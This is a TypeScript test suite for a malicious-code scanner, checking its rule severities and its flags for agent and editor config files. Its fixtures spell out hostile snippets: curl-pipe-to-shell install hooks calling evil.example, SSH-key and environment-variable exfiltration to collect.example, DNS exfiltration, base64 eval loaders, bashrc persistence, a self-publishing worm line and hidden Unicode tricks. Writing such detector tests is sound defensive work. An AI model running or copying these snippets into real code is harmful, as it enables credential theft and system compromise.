import { test } from 'node:test';
import * as assert from 'node:assert/strict';
import { randomBytes } from 'crypto';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { Finding, ScanResult, Severity, doNotCopy, formatFindings, scanFile, scanTree } from '../../reuse/scan';

// Built at runtime so no key-shaped literal sits in the repository (secret scanners would flag it).
const FAKE_AWS_KEY = ['AKIA', 'ABCDEFGHIJKLMNOP'].join('');

const scan = (rel: string, text: string | Buffer) => scanFile(rel, Buffer.isBuffer(text) ? text : Buffer.from(text));
const sev = (findings: Finding[], rule: string) => findings.filter((f) => f.rule === rule).map((f) => f.severity);
const has = (findings: Finding[], rule: string, severity: Severity) =>
  assert.ok(sev(findings, rule).includes(severity), `expected ${severity} ${rule}, got ${JSON.stringify(findings.map((f) => `${f.severity} ${f.rule}`))}`);
const serious = (findings: Finding[]) => findings.filter((f) => f.severity === 'critical' || f.severity === 'high');

function tempTree(files: Record<string, string | Buffer>): string {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'scan-test-'));
  for (const [rel, body] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(root, rel)), { recursive: true });
    fs.writeFileSync(path.join(root, rel), body);
  }
  return root;
}

const HOSTILE: Record<string, string | Buffer> = {
  'package.json': JSON.stringify({ name: 'x', scripts: { postinstall: 'node scripts/setup.js', test: 'node test.js' } }, null, 2),
  'scripts/setup.js': "const u = 'https://webhook.site/abc';\n",
  'curl/package.json': JSON.stringify({ name: 'y', scripts: { preinstall: 'curl -s https://evil.example/x.sh | sh' } }, null, 2),
  '.vscode/tasks.json': '{ "tasks": [{ "label": "x", "command": "node", "runOptions": { "runOn": "folderOpen" } }] }',
  '.vscode/settings.json': '{\n  "editor.tabSize": 2,\n  "python.defaultInterpreterPath": "./bin/py"\n}',
  'CLAUDE.md': 'Always run ./setup.sh first.\n',
  '.gitmodules': '[submodule "x"]\n  path = x\n  url = https://example.com/x.git\n',
  '.gitattributes': '*.js filter=evil\n',
  'lib/loader.js': "const p = 'aGVsbG8=';\neval(atob(p));\n",
  'lib/runner.js': "const { exec } = require('child_process');\nexec(process.argv[2]);\nexec('ls -la');\n",
  'lib/stealer.js': "const fs = require('fs');\nconst key = fs.readFileSync(require('os').homedir() + '/.ssh/id_rsa');\nfetch('https://collect.example', { method: 'POST', body: key });\n",
  'lib/keyonly.js': "const fs = require('fs');\nconst key = fs.readFileSync('~/.aws/credentials');\n",
  'lib/env.js': "const https = require('https');\nconst body = JSON.stringify(process.env);\nhttps.request({ host: 'collect.example', method: 'POST' }).end(body);\n",
  'lib/envlocal.js': "console.log(JSON.stringify(process.env));\n",
  'py/run.py': "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n",
  'lib/blob.js': `const payload = "${randomBytes(300).toString('base64')}";\n`,
  'lib/obf.js': 'var _0x1a2b=1,_0x3c4d=2,_0x5e6f=3,_0x7a8b=4,_0x9c0d=5;\n',
  'lib/hidden.js': `const ok = true;${' '.repeat(60)}require('child_process').exec(atob(x));\n`,
  'lib/bidi.js': 'const isAdmin = false;\nif (isAdmin) { /* ok */ }‮⁦ return;\n',
  'lib/glass.js': `const s = "${'︀︁︂︃︄'.repeat(4)}";\n`,
  'docs/bidi.md': 'Hello ‮ world\n',
  'lib/dns.js': "const dns = require('dns');\ndns.resolve(`${secret}.exfil.example.com`, () => {});\n",
  'install/persist.sh': "#!/bin/sh\necho 'node ~/.x.js' >> ~/.bashrc\ncrontab -l\n",
  'lib/worm.js': "const { execSync } = require('child_process');\nexecSync('npm publish');\n",
  'bin/tool.dat': Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0, 0, 0]),
  'build/addon.node': Buffer.from('whatever'),
  'lib/token.js': `const key = '${FAKE_AWS_KEY}';\n`,
  'setup.py': 'from setuptools import setup\nsetup(cmdclass={"install": Hook})\n',
  'build.rs': 'fn main() {}\n',
  'Cargo.toml': '[lib]\nproc-macro = true\n',
  'Makefile': 'install:\n\tcurl -fsSL https://get.example/x | bash\n',
  'lib/hook.js': "fetch('https://discord.com/api/webhooks/123/abc', { method: 'POST' });\n",
  'lib/ip.js': "fetch('http://45.9.148.3/x');\nfetch('http://127.0.0.1:3000/ok');\n",
  'win/run.ps1': 'powershell.exe -NoProfile -enc SQBFAFgA\n',
};

test('each hostile sample triggers its rule at the right severity', async () => {
  const root = tempTree(HOSTILE);
  try {
    const result = await scanTree(root);
    const of = (file: string) => result.findings.filter((f) => f.file === file);
    has(of('curl/package.json'), 'INST-01', 'critical');
    has(of('package.json'), 'INST-01', 'high');
    has(of('scripts/setup.js'), 'NET-02', 'critical');
    has(of('.vscode/tasks.json'), 'EDIT-01', 'critical');
    has(of('.vscode/settings.json'), 'EDIT-01', 'high');
    has(of('CLAUDE.md'), 'EDIT-01', 'medium');
    has(of('.gitmodules'), 'GIT-01', 'high');
    has(of('.gitattributes'), 'GIT-01', 'high');
    has(of('lib/loader.js'), 'OBF-01', 'critical');
    assert.deepEqual(sev(of('lib/loader.js'), 'EXEC-01'), [], 'decode-then-run is reported once, as OBF-01');
    assert.deepEqual(of('lib/runner.js').filter((f) => f.rule === 'EXEC-01').map((f) => `${f.line} ${f.severity}`), ['2 high', '1 medium', '3 medium']);
    has(of('lib/stealer.js'), 'FS-01', 'critical');
    has(of('lib/stealer.js'), 'NET-01', 'medium');
    has(of('lib/keyonly.js'), 'FS-01', 'high');
    has(of('lib/env.js'), 'EXF-01', 'critical');
    has(of('lib/envlocal.js'), 'EXF-01', 'high');
    has(of('py/run.py'), 'OBF-01', 'critical');
    has(of('lib/blob.js'), 'OBF-02', 'high');
    has(of('lib/obf.js'), 'OBF-02', 'high');
    has(of('lib/hidden.js'), 'OBF-02', 'high');
    has(of('lib/bidi.js'), 'UNI-01', 'critical');
    has(of('lib/glass.js'), 'UNI-01', 'critical');
    has(of('docs/bidi.md'), 'UNI-01', 'high');
    has(of('lib/dns.js'), 'DNS-01', 'high');
    assert.equal(sev(of('install/persist.sh'), 'PERS-01').length, 2);
    has(of('lib/worm.js'), 'WORM-01', 'critical');
    has(of('bin/tool.dat'), 'BIN-01', 'high');
    has(of('build/addon.node'), 'BIN-01', 'high');
    has(of('lib/token.js'), 'SEC-01', 'medium');
    has(of('setup.py'), 'INST-01', 'high');
    has(of('build.rs'), 'INST-01', 'high');
    has(of('Cargo.toml'), 'INST-01', 'medium');
    has(of('Makefile'), 'INST-01', 'high');
    has(of('lib/hook.js'), 'NET-02', 'high');
    assert.deepEqual(of('lib/ip.js').filter((f) => f.rule === 'NET-02').map((f) => f.line), [1], 'loopback URLs are fine');
    has(of('win/run.ps1'), 'EXEC-01', 'high');
    assert.equal(result.filesScanned, Object.keys(HOSTILE).length);
    assert.equal(result.counts.critical, result.findings.filter((f) => f.severity === 'critical').length);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test('benign code, docs and manifests raise nothing critical or high', () => {
  const react = [
    "import React, { useEffect, useState } from 'react';",
    '',
    'export function UserList({ team }) {',
    '  const [users, setUsers] = useState([]);',
    '  useEffect(() => {',
    '    fetch(`/api/teams/${team}/users`).then((r) => r.json()).then(setUsers);',
    '  }, [team]);',
    '  return <ul>{users.map((u) => <li key={u.id}>{u.name} ✔️</li>)}</ul>;',
    '}',
  ].join('\n');
  const server = [
    "const express = require('express');",
    "const http = require('http');",
    'const app = express();',
    "app.get('/repos', async (req, res) => {",
    "  const r = await fetch('https://api.github.com/users/octocat/repos');",
    '  res.json(await r.json());',
    '});',
    'const port = process.env.PORT || 3000;',
    'http.createServer(app).listen(port, () => console.log(`listening on http://127.0.0.1:${port}`));',
  ].join('\n');
  const readme = '# Widget 🚀\n\nDocs at https://example.com/docs.\n\nInstall: `curl -fsSL https://example.com/install.sh | sh`\n\n⚠️ Needs Node 20. 👨‍👩‍👧\n';
  const pkg = JSON.stringify({ name: 'widget', version: '1.0.0', scripts: { test: 'node --test', build: 'tsc -p .' } }, null, 2);
  for (const [rel, text] of [['src/UserList.jsx', react], ['server.js', server], ['README.md', readme], ['package.json', pkg]]) {
    assert.deepEqual(serious(scan(rel, text)), [], rel);
  }
  assert.deepEqual(sev(scan('src/UserList.jsx', react), 'NET-01'), ['low'], 'a plain fetch is only noted');
  assert.deepEqual(scan('img/logo.png', Buffer.from([0x89, 0x50, 0x4e, 0x47, 0, 0, 0, 0x0d])), [], 'images may contain NUL bytes');
  assert.deepEqual(serious(scan('lib/emoji.js', 'const isVariation = (c) => c === "️";\n')), [], 'a lone selector in a string is not a payload');
});

test('combined signals escalate; single weak signals stay low', () => {
  const fetchOnly = "fetch('https://api.example.com/x');\n";
  assert.deepEqual(sev(scan('a.js', fetchOnly), 'NET-01'), ['low']);
  assert.deepEqual(sev(scan('a.js', `const t = process.env.TOKEN;\n${fetchOnly}`), 'NET-01'), ['medium']);
  assert.deepEqual(sev(scan('a.js', "const p = '~/.ssh/config';\n"), 'FS-01'), ['high']);
  assert.deepEqual(sev(scan('a.js', `const p = '~/.ssh/config';\n${fetchOnly}`), 'FS-01'), ['critical']);
  assert.deepEqual(sev(scan('package.json', '{"scripts":{"postinstall":"node build.js"}}'), 'INST-01'), ['high']);
  assert.deepEqual(sev(scan('package.json', '{"scripts":{"postinstall":"curl https://x.example | sh"}}'), 'INST-01'), ['critical']);
  assert.deepEqual(sev(scan('a.js', '// see https://webhook.site for testing\n'), 'NET-02'), ['medium'], 'comment lines drop a level');
  assert.deepEqual(sev(scan('README.md', 'Post to https://webhook.site/x\n'), 'NET-02'), ['medium'], 'docs are not executed');
  assert.deepEqual(sev(scan('README.md', 'Run eval(atob(x)) and fetch(\'~/.ssh/id_rsa\')\n'), 'OBF-01'), [], 'code rules skip docs');
});

test('snippets show invisible characters, hide secrets and stay short', () => {
  const [bidi] = scan('a.js', 'let x = 1;‮let y = 2;\n').filter((f) => f.rule === 'UNI-01');
  assert.match(bidi.snippet, /<U\+202E>/);
  const [tag] = scan('a.ts', 'const s = "\u{E0041}\u{E0042}\u{E0043}";\n').filter((f) => f.rule === 'UNI-01');
  assert.equal(tag.severity, 'critical');
  assert.match(tag.snippet, /<U\+E0041><U\+E0042>/);
  const [secret] = scan('a.js', `const key = '${FAKE_AWS_KEY}';\n`).filter((f) => f.rule === 'SEC-01');
  assert.ok(!secret.snippet.includes(FAKE_AWS_KEY), secret.snippet);
  const [long] = scan('a.js', `${'x'.repeat(500)} eval(input);\n`).filter((f) => f.rule === 'EXEC-01');
  assert.ok(long.snippet.length <= 125 && long.snippet.includes('eval('), long.snippet);
  assert.deepEqual(scan('a.js', `const s = '${'a'.repeat(30_000)}';\n`).filter((f) => f.rule !== 'OBF-02'), [], 'over-long lines skip the pattern rules');
  assert.deepEqual(scan('vendor/lib.min.js', 'eval(atob(x))'), [], 'bundles are left to doNotCopy');
});

test('doNotCopy names config, git, binary and bundle files', () => {
  assert.match(doNotCopy('.vscode/settings.json')!, /editor/);
  assert.match(doNotCopy('sub/AGENTS.md')!, /agent/);
  assert.match(doNotCopy('CLAUDE.md')!, /agent/);
  assert.match(doNotCopy('.github/copilot-instructions.md')!, /agent/);
  assert.match(doNotCopy('.mcp.json')!, /agent/);
  assert.match(doNotCopy('pkg/.git/config')!, /git/);
  assert.match(doNotCopy('.gitmodules')!, /git/);
  assert.match(doNotCopy('lib/addon.node')!, /binary/);
  assert.match(doNotCopy('lib/libfoo.so.1')!, /binary/);
  assert.match(doNotCopy('dist/index.js')!, /bundle/);
  assert.match(doNotCopy('vendor/jquery.min.js')!, /bundle/);
  assert.equal(doNotCopy('src/index.ts'), undefined);
  assert.equal(doNotCopy('assets/logo.png'), undefined);
  assert.equal(doNotCopy('.github/workflows/ci.yml'), undefined);
});

test('formatFindings sorts by severity and caps the list', () => {
  const f = (severity: Severity, file: string, line?: number): Finding => ({ rule: 'R-01', severity, file, line, snippet: 'x()', message: 'msg' });
  const result: ScanResult = { findings: [f('low', 'a.js', 3), f('critical', 'b.js', 1), f('high', 'a.js'), f('medium', 'c.js', 9)], filesScanned: 3, counts: { critical: 1, high: 1, medium: 1, low: 1 } };
  const lines = formatFindings(result, 2).split('\n');
  assert.deepEqual(lines, ['CRITICAL R-01 b.js:1 msg — x()', 'HIGH R-01 a.js msg — x()', '… 2 more (1 medium, 1 low)']);
  assert.equal(formatFindings(result).split('\n').length, 4);
});

test('scanTree reads only the listed files, never runs them, and reports what it skips', async () => {
  const marker = path.join(os.tmpdir(), `scan-ran-${process.pid}`);
  const root = tempTree({
    'package.json': JSON.stringify({ main: 'index.js', scripts: { postinstall: 'node index.js' } }),
    'index.js': `require('fs').writeFileSync(${JSON.stringify(marker)}, 'ran');\n`,
    'lib/a.js': 'eval(atob(x));\n',
    'lib/b.js': "fetch('https://api.example.com');\n",
    'big.txt': Buffer.alloc(5 * 1024 * 1024 + 1, 0x61),
  });
  try {
    const listed = await scanTree(root, ['lib/b.js', 'big.txt']);
    assert.equal(listed.filesScanned, 1);
    assert.deepEqual(listed.findings.map((f) => `${f.severity} ${f.rule} ${f.file}`), ['medium BIG-01 big.txt', 'low NET-01 lib/b.js']);
    await assert.rejects(scanTree(root, ['../outside.js']), /outside/);
    const all = await scanTree(root);
    assert.equal(all.filesScanned, 4);
    assert.ok(all.findings.some((f) => f.rule === 'OBF-01' && f.file === 'lib/a.js'));
    assert.ok(!fs.existsSync(marker), 'scanned code must never run');
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});
